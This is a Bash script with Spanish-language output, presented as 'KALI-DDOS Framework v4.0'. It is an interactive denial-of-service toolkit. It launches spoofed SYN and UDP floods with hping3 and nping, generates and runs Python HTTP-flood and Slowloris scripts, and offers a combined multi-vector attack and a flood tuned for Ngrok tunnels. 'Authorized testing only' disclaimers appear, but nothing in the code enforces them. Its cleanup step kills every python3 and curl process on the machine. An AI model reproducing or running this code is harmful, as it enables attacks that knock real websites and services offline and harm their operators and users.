#!/usr/bin/env bash
#Desarrollado por zdoskiki ayudado autores anonimos
# KALI-DDOS Framework v4.0
# Advanced Security Assessment & Stress Testing Tool

# Colores mejorados
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
BG_RED='\033[1;41m'
BG_GREEN='\033[1;42m'
RESET='\033[0m'

# Configuración personalizable - AJUSTA ESTOS VALORES A TU GUSTO
THREADS=1000
DURATION=120
PACKET_SIZE=1024
TIMEOUT=10
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Variables globales
TARGET=""
PORT=80
ATTACK_PID=""

# Animación de carga
spinner() {
    local pid=$1
    local text=$2
    local delay=0.1
    local spin=('⣷' '⣯' '⣟' '⡿' '⢿' '⣻' '⣽' '⣾')
    
    echo -ne "${CYAN}[ ] ${text}${RESET}"
    
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        for i in "${spin[@]}"; do
            echo -ne "\r${CYAN}[${i}] ${text}${RESET}"
            sleep $delay
        done
    done
    echo -ne "\r${GREEN}[✓] ${text}${RESET}\n"
}

# Banner mejorado
print_banner() {
    clear
    echo -e "${PURPLE}"
    cat << "BANNER"
╔══════════════════════════════════════════════════════════╗
║                KALI-DDOS FRAMEWORK v4.0                  ║
║           Advanced Security Assessment Tool              ║
║             For Authorized Testing Only                  ║
╚══════════════════════════════════════════════════════════╝

 ██╗  ██╗ █████╗ ██╗     ██╗    ██████╗ ██████╗  ██████╗ ███████╗
 ██║ ██╔╝██╔══██╗██║     ██║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
 █████╔╝ ███████║██║     ██║    ██║  ██║██║  ██║██║   ██║███████╗
 ██╔═██╗ ██╔══██║██║     ██║    ██║  ██║██║  ██║██║   ██║╚════██║
 ██║  ██╗██║  ██║███████╗███████╗██████╔╝██████╔╝╚██████╔╝███████║
 ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
BANNER
    echo -e "${RESET}"
    echo -e "${BG_RED}⚠️  ADVERTENCIA: Solo para pruebas autorizadas y educativas ⚠️${RESET}"
    echo -e "${BG_RED}   El uso no autorizado es ILEGAL y puede tener consecuencias${RESET}\n"
}

# Verificar root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[✗] Debes ejecutar como root${RESET}"
        exit 1
    fi
}

# Verificar dependencias mejorado
check_dependencies() {
    local deps=("hping3" "nmap" "curl" "python3" "dig")
    local missing=()
    
    echo -e "${BLUE}[*] Verificando dependencias...${RESET}"
    
    for dep in "${deps[@]}"; do
        if command -v $dep &> /dev/null; then
            echo -e "${GREEN}    [✓] $dep${RESET}"
        else
            echo -e "${RED}    [✗] $dep${RESET}"
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[!] Instalando dependencias faltantes...${RESET}"
        apt-get update > /dev/null 2>&1
        
        for dep in "${missing[@]}"; do
            case $dep in
                "hping3") apt-get install -y hping3 > /dev/null 2>&1 ;;
                "nmap") apt-get install -y nmap > /dev/null 2>&1 ;;
                "dig") apt-get install -y dnsutils > /dev/null 2>&1 ;;
            esac
            echo -e "${GREEN}    [✓] $dep instalado${RESET}"
        done
    fi
    
    # Instalar dependencias Python
    if ! python3 -c "import requests" &> /dev/null; then
        pip3 install requests > /dev/null 2>&1
        echo -e "${GREEN}    [✓] Python requests instalado${RESET}"
    fi
}

# Resolver DNS
resolve_dns() {
    local domain=$1
    if [ -z "$domain" ]; then
        domain=$TARGET
    fi
    
    echo -e "${CYAN}[*] Resolviendo DNS para: $domain${RESET}"
    
    # Obtener IP principal
    local ip=$(dig +short $domain | head -1)
    if [ -n "$ip" ]; then
        echo -e "${GREEN}[✓] IP encontrada: $ip${RESET}"
        
        # Obtener todas las IPs
        echo -e "${CYAN}[*] Todas las direcciones IP:${RESET}"
        dig +short $domain | while read record; do
            if [[ $record =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                echo -e "    ${GREEN}📍 $record${RESET}"
            fi
        done
        
        # Información adicional
        echo -e "${CYAN}[*] Información adicional:${RESET}"
        local mx=$(dig +short MX $domain | head -1)
        local ns=$(dig +short NS $domain | head -1)
        
        if [ -n "$mx" ]; then
            echo -e "    ${BLUE}📧 MX: $mx${RESET}"
        fi
        if [ -n "$ns" ]; then
            echo -e "    ${BLUE}🔧 NS: $ns${RESET}"
        fi
        
        return 0
    else
        echo -e "${RED}[✗] No se pudo resolver el dominio${RESET}"
        return 1
    fi
}

# Obtener objetivo
get_target() {
    echo -e "${CYAN}[*] Configuración del objetivo${RESET}"
    
    read -p "Ingresa URL o IP del objetivo: " TARGET
    
    # Si es un dominio, resolver DNS
    if [[ $TARGET =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        resolve_dns $TARGET
    fi
    
    # Validar objetivo
    if [[ $TARGET =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || [[ $TARGET =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        echo -e "${GREEN}[✓] Objetivo configurado: $TARGET${RESET}"
        return 0
    else
        echo -e "${RED}[✗] Objetivo inválido${RESET}"
        return 1
    fi
}

# Obtener puerto
get_port() {
    read -p "Ingresa el puerto del objetivo (default 80): " input
    PORT=${input:-80}
    echo -e "${GREEN}[✓] Puerto: $PORT${RESET}"
}

# Obtener duración
get_duration() {
    read -p "Ingresa la duración en segundos (default $DURATION): " input
    DURATION=${input:-$DURATION}
    echo -e "${GREEN}[✓] Duración: ${DURATION}s${RESET}"
}

# Obtener threads
get_threads() {
    read -p "Ingresa el número de threads (default $THREADS): " input
    THREADS=${input:-$THREADS}
    echo -e "${GREEN}[✓] Threads: $THREADS${RESET}"
}

# Configuración personalizada
custom_config() {
    echo -e "${CYAN}[*] Configuración actual:${RESET}"
    echo -e "    Threads: $THREADS"
    echo -e "    Duración: ${DURATION}s"
    echo -e "    Puerto: $PORT"
    echo ""
    
    get_threads
    get_duration
    get_port
}

# Escáner de puertos
port_scan() {
    echo -e "${CYAN}[*] Iniciando escaneo de puertos...${RESET}"
    
    # Escaneo rápido de puertos comunes
    local common_ports="21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443"
    
    (nmap -T4 --open -p $common_ports $TARGET 2>/dev/null | grep -E '^[0-9]' > /tmp/nmap_scan.txt) &
    spinner $! "Escaneando puertos comunes"
    
    echo -e "${GREEN}[✓] Puertos abiertos encontrados:${RESET}"
    if [ -s /tmp/nmap_scan.txt ]; then
        while read line; do
            local port=$(echo $line | cut -d'/' -f1)
            local service=$(echo $line | cut -d'/' -f3)
            local state=$(echo $line | cut -d'/' -f2)
            echo -e "    ${GREEN}🛡️  Puerto $port: $service ($state)${RESET}"
        done < /tmp/nmap_scan.txt
    else
        echo -e "    ${RED}No se encontraron puertos abiertos${RESET}"
    fi
    
    rm -f /tmp/nmap_scan.txt
}

# Información del sistema
system_info() {
    echo -e "${CYAN}[*] Información del sistema:${RESET}"
    echo -e "${BLUE}    CPU: $(top -bn1 | grep "Cpu(s)" | awk '{print $2}')% uso${RESET}"
    echo -e "${BLUE}    Memoria: $(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2}') usado${RESET}"
    echo -e "${BLUE}    Uptime: $(uptime -p | sed 's/up //')${RESET}"
    echo -e "${BLUE}    IP Local: $(hostname -I | awk '{print $1}')${RESET}"
}

# Ataque SYN Flood - ALTAMENTE EFECTIVO
syn_flood() {
    echo -e "${YELLOW}[*] Iniciando SYN Flood...${RESET}"
    echo -e "${RED}[!] ⚡ Este ataque es muy efectivo para saturar servicios${RESET}"
    
    local start_time=$(date +%s)
    local end_time=$((start_time + DURATION))
    
    # Ataque principal con hping3
    for i in $(seq 1 $((THREADS / 10))); do
        hping3 --syn --flood --rand-source --data $PACKET_SIZE $TARGET -p $PORT 2>/dev/null &
    done
    
    # Ataque secundario con SYN
    for i in $(seq 1 $((THREADS / 20))); do
        nping --tcp -p $PORT --flags syn --rate $((THREADS / 100)) -c $((DURATION * 10)) $TARGET 2>/dev/null &
    done
    
    ATTACK_PID=$!
    echo -e "${GREEN}[✓] SYN Flood ejecutándose por ${DURATION}s${RESET}"
    echo -e "${CYAN}[!] Efectividad: 🚀 ALTA - Satura la tabla de conexiones${RESET}"
    
    # Monitorizar
    while [ $(date +%s) -lt $end_time ]; do
        echo -e "${YELLOW}[*] Enviando paquetes SYN... ($(($(date +%s) - start_time))s/${DURATION}s)${RESET}"
        sleep 5
    done
    
    cleanup
    echo -e "${GREEN}[✓] SYN Flood finalizado${RESET}"
}

# Ataque UDP Flood - VOLUMÉTRICO
udp_flood() {
    echo -e "${YELLOW}[*] Iniciando UDP Flood...${RESET}"
    echo -e "${RED}[!] 🌊 Ataque volumétrico - Consume ancho de banda${RESET}"
    
    local start_time=$(date +%s)
    local end_time=$((start_time + DURATION))
    
    # Ataque principal con hping3
    for i in $(seq 1 $((THREADS / 5))); do
        hping3 --udp --flood --rand-source --data $PACKET_SIZE $TARGET -p $PORT 2>/dev/null &
    done
    
    ATTACK_PID=$!
    echo -e "${GREEN}[✓] UDP Flood ejecutándose por ${DURATION}s${RESET}"
    echo -e "${CYAN}[!] Efectividad: 🌊 MEDIA-ALTA - Consume recursos de red${RESET}"
    
    # Monitorizar
    while [ $(date +%s) -lt $end_time ]; do
        echo -e "${YELLOW}[*] Enviando paquetes UDP... ($(($(date +%s) - start_time))s/${DURATION}s)${RESET}"
        sleep 5
    done
    
    cleanup
    echo -e "${GREEN}[✓] UDP Flood finalizado${RESET}"
}

# Ataque HTTP Flood - CAPA DE APLICACIÓN
http_flood() {
    echo -e "${YELLOW}[*] Iniciando HTTP Flood...${RESET}"
    echo -e "${RED}[!] 🌐 Ataque de capa de aplicación - Consume recursos del servidor${RESET}"
    
    cat > /tmp/http_flood.py << 'EOF'
import requests
import threading
import time
import random
import sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuración
target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
thread_count = int(sys.argv[4]) if len(sys.argv) > 4 else 500

print(f"[*] Iniciando HTTP Flood")
print(f"[*] Objetivo: {target}:{port}")
print(f"[*] Duración: {duration}s")
print(f"[*] Threads: {thread_count}")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
]

paths = ["/", "/index.html", "/home", "/api", "/admin", "/login", "/test"]
stop = False
requests_count = 0

def attacker():
    global stop, requests_count
    session = requests.Session()
    while not stop:
        try:
            url = f"http://{target}:{port}{random.choice(paths)}"
            headers = {
                'User-Agent': random.choice(user_agents),
                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            session.get(url, headers=headers, timeout=5, verify=False)
            requests_count += 1
            if requests_count % 50 == 0:
                print(f"[+] Requests enviados: {requests_count}")
        except:
            pass

# Iniciar threads
threads = []
for i in range(thread_count):
    t = threading.Thread(target=attacker)
    t.daemon = True
    threads.append(t)
    t.start()

# Ejecutar por el tiempo especificado
time.sleep(duration)
stop = True
print(f"[!] Total requests enviados: {requests_count}")
EOF

    python3 /tmp/http_flood.py "$TARGET" "$PORT" "$DURATION" "$THREADS" &
    ATTACK_PID=$!
    
    echo -e "${GREEN}[✓] HTTP Flood ejecutándose por ${DURATION}s${RESET}"
    echo -e "${CYAN}[!] Efectividad: ⚡ ALTA - Consume CPU/RAM del servidor${RESET}"
    
    # Esperar
    sleep $DURATION
    
    # Limpiar
    kill $ATTACK_PID 2>/dev/null
    rm -f /tmp/http_flood.py
    echo -e "${GREEN}[✓] HTTP Flood finalizado${RESET}"
}

# Ataque Slowloris - BAJO ANCHO DE BANDA
slowloris_attack() {
    echo -e "${YELLOW}[*] Iniciando Slowloris...${RESET}"
    echo -e "${RED}[!] 🐌 Ataque lento pero efectivo - Bajo consumo de ancho de banda${RESET}"
    
    cat > /tmp/slowloris.py << 'EOF'
import socket
import threading
import time
import random
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
sockets_count = int(sys.argv[4]) if len(sys.argv) > 4 else 500

print(f"[*] Iniciando Slowloris")
print(f"[*] Objetivo: {target}:{port}")
print(f"[*] Duración: {duration}s")
print(f"[*] Sockets: {sockets_count}")

sockets = []
stop = False

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
        s.send("Content-length: 42\r\n".encode())
        return s
    except:
        return None

def maintain_connections():
    global stop
    while not stop:
        current_count = len(sockets)
        if current_count < sockets_count:
            s = create_socket()
            if s:
                sockets.append(s)
        
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except:
                sockets.remove(s)
        
        time.sleep(15)

print(f"[*] Creando conexiones lentas...")
maintain_thread = threading.Thread(target=maintain_connections)
maintain_thread.start()

time.sleep(duration)
stop = True

for s in sockets:
    try:
        s.close()
    except:
        pass

print(f"[!] Slowloris finalizado - Conexiones mantenidas: {len(sockets)}")
EOF

    python3 /tmp/slowloris.py "$TARGET" "$PORT" "$DURATION" "$THREADS" &
    ATTACK_PID=$!
    
    echo -e "${GREEN}[✓] Slowloris ejecutándose por ${DURATION}s${RESET}"
    echo -e "${CYAN}[!] Efectividad: 🎯 MEDIA - Ideal para servidores con límite de conexiones${RESET}"
    
    # Esperar
    sleep $DURATION
    
    # Limpiar
    kill $ATTACK_PID 2>/dev/null
    rm -f /tmp/slowloris.py
    echo -e "${GREEN}[✓] Slowloris finalizado${RESET}"
}

# Ataque Mixto - MÁXIMA EFECTIVIDAD
mixed_attack() {
    echo -e "${YELLOW}[*] Iniciando Ataque Mixto Multi-Vector...${RESET}"
    echo -e "${RED}[!] 💥 COMBINACIÓN MÁXIMA - Todos los vectores simultáneos${RESET}"
    
    local start_time=$(date +%s)
    local end_time=$((start_time + DURATION))
    
    echo -e "${CYAN}[!] Lanzando todos los vectores de ataque...${RESET}"
    
    # Iniciar todos los ataques
    (http_flood) &
    (syn_flood) &
    (udp_flood) &
    (slowloris_attack) &
    
    ATTACK_PID=$!
    echo -e "${GREEN}[✓] Ataque Mixto ejecutándose por ${DURATION}s${RESET}"
    echo -e "${CYAN}[!] Efectividad: 💀 MÁXIMA - Combinación de todas las técnicas${RESET}"
    
    # Mostrar progreso
    while [ $(date +%s) -lt $end_time ]; do
        local elapsed=$(( $(date +%s) - start_time ))
        echo -e "${YELLOW}[*] Ataque en progreso... (${elapsed}s/${DURATION}s)${RESET}"
        echo -e "${RED}[!] ⚡ HTTP Flood + 🌊 UDP Flood + 🚀 SYN Flood + 🐌 Slowloris${RESET}"
        sleep 10
    done
    
    cleanup
    echo -e "${GREEN}[✓] Ataque Mixto finalizado${RESET}"
}

# Ataque de estrés para Ngrok
ngrok_stress_test() {
    echo -e "${YELLOW}[*] Iniciando prueba de estrés especial para Ngrok...${RESET}"
    echo -e "${RED}[!] 🎯 Optimizado para servicios tunnel como Ngrok${RESET}"
    
    # Configuración optimizada para Ngrok
    local original_threads=$THREADS
    local original_duration=$DURATION
    
    THREADS=800  # Optimizado para Ngrok
    DURATION=90  # Duración extendida
    
    echo -e "${CYAN}[!] Ajustando parámetros para Ngrok...${RESET}"
    echo -e "${CYAN}    Threads: $THREADS | Duración: ${DURATION}s${RESET}"
    
    # Usar HTTP Flood optimizado
    http_flood
    
    # Restaurar configuración original
    THREADS=$original_threads
    DURATION=$original_duration
}

# Limpiar procesos
cleanup() {
    echo -e "${YELLOW}[*] Limpiando procesos...${RESET}"
    pkill -f hping3 2>/dev/null
    pkill -f python3 2>/dev/null
    pkill -f nping 2>/dev/null
    pkill -f curl 2>/dev/null
    rm -f /tmp/*.py 2>/dev/null
    ATTACK_PID=""
    echo -e "${GREEN}[✓] Limpieza completada${RESET}"
}

# Test de conectividad
test_connectivity() {
    echo -e "${CYAN}[*] Probando conectividad con $TARGET...${RESET}"
    if ping -c 2 -W 2 $TARGET &>/dev/null; then
        echo -e "${GREEN}[✓] Objetivo responde a ping${RESET}"
    else
        echo -e "${YELLOW}[!] Objetivo no responde a ping${RESET}"
    fi
    
    if curl -s --connect-timeout 5 "http://$TARGET:$PORT" &>/dev/null; then
        echo -e "${GREEN}[✓] Servicio HTTP activo${RESET}"
    else
        echo -e "${RED}[✗] Servicio HTTP no responde${RESET}"
    fi
}

# Menú principal
show_main_menu() {
    while true; do
        clear
        print_banner
        
        echo -e "${CYAN}╔══════════════════════════════════════════════════════════╗${RESET}"
        echo -e "${CYAN}║                   MENÚ PRINCIPAL                         ║${RESET}"
        echo -e "${CYAN}╚══════════════════════════════════════════════════════════╝${RESET}"
        echo ""
        
        # Información actual
        echo -e "${PURPLE}🎯 Objetivo: $TARGET | 🔌 Puerto: $PORT | ⏱️ Duración: ${DURATION}s | 🚀 Threads: $THREADS${RESET}"
        echo ""
        
        echo -e "${GREEN}┌─── INFORMACIÓN Y RECONOCIMIENTO ───${RESET}"
        echo -e "${GREEN}│ 1. Resolver DNS y información del objetivo"
        echo -e "│ 2. Escanear puertos y servicios"
        echo -e "│ 3. Información del sistema"
        echo -e "│ 4. Test de conectividad"
        echo -e "└────────────────────────────────────"
        echo ""
        echo -e "${YELLOW}┌─── PRUEBAS DE ESTRÉS ───${RESET}"
        echo -e "${YELLOW}│ 5. HTTP Flood Avanzado    ⚡ ALTA EFECTIVIDAD"
        echo -e "│ 6. SYN Flood               🚀 ALTA EFECTIVIDAD" 
        echo -e "│ 7. UDP Flood               🌊 VOLUMÉTRICO"
        echo -e "│ 8. Slowloris Attack        🐌 BAJO ANCHO DE BANDA"
        echo -e "│ 9. Ataque Mixto            💥 MÁXIMA EFECTIVIDAD"
        echo -e "│ 10. Prueba Ngrok Especial  🎯 OPTIMIZADO"
        echo -e "└──────────────────────────"
        echo ""
        echo -e "${RED}┌─── CONFIGURACIÓN ───${RESET}"
        echo -e "${RED}│ C. Configurar parámetros"
        echo -e "│ S. Configurar objetivo/puerto"
        echo -e "│ X. Limpiar procesos"
        echo -e "│ 0. Salir"
        echo -e "└──────────────────────${RESET}"
        echo ""
        
        read -p "Selecciona una opción: " choice
        
        case $choice in
            1) resolve_dns ;;
            2) port_scan ;;
            3) system_info ;;
            4) test_connectivity ;;
            5) http_flood ;;
            6) syn_flood ;;
            7) udp_flood ;;
            8) slowloris_attack ;;
            9) mixed_attack ;;
            10) ngrok_stress_test ;;
            C|c) custom_config ;;
            S|s) 
                get_target
                get_port
                ;;
            X|x) cleanup ;;
            0) 
                cleanup
                echo -e "${YELLOW}[!] Saliendo... ¡Usa responsablemente!${RESET}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Opción inválida${RESET}"
                sleep 1
                ;;
        esac
        
        echo ""
        echo -e "${YELLOW}[!] Presiona Enter para continuar...${RESET}"
        read
    done
}

# Función principal
main() {
    check_root
    print_banner
    check_dependencies
    
    echo -e "${YELLOW}[!] Este software es solo para pruebas de seguridad autorizadas${RESET}"
    echo -e "${YELLOW}[!] El uso no autorizado es ILEGAL y está estrictamente prohibido${RESET}"
    echo ""
    
    # Configuración inicial
    if [ -z "$TARGET" ]; then
        get_target || exit 1
        get_port
    fi
    
    show_main_menu
}

# Manejar Ctrl+C
trap 'echo -e "\n${RED}[!] Interrumpido. Limpiando...${RESET}"; cleanup; exit 1' SIGINT

# Ejecutar
if [[ "$1" == "--help" ]]; then
    echo "Uso: $0"
    echo "KALI-DDOS Framework v4.0 - Advanced Security Testing Tool"
    echo ""
    echo "Efectividad de ataques:"
    echo "  HTTP Flood    ⚡ ALTA - Consume recursos del servidor"
    echo "  SYN Flood     🚀 ALTA - Satura tabla de conexiones"  
    echo "  UDP Flood     🌊 MEDIA-ALTA - Consume ancho de banda"
    echo "  Slowloris     🎯 MEDIA - Ideal para límites de conexión"
    echo "  Ataque Mixto  💥 MÁXIMA - Combinación de todas las técnicas"
    echo ""
    echo "⚠️  SOLO PARA USO EDUCATIVO Y AUTORIZADO ⚠️"
else
    main
fi
